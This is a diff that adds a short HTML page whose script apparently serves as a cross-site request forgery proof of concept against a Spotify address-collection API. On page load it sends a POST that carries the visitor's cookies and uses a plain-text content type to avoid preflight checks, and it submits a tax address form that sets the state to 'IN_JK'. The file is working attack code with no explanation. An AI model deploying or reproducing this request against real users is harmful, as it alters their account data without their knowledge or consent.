@@ -1,0 +1,19 @@
+<script>
+fetch("https://www.spotify.com/api/commerce-address-collection-service/spotify.addresscollection.v1.AddressCollectionService/SubmitForm", {
+  method: "POST",
+  credentials: "include",
+  headers: {
+    "Content-Type": "text/plain"
+  },
+  body: JSON.stringify({
+    details:{
+      configurationType:"tax",
+      country:"IN",
+      locale:"en_IN"
+    },
+    fieldValues:[
+      {id:"state",value:"IN_JK"},
+    ]
+  })
+});
+</script>
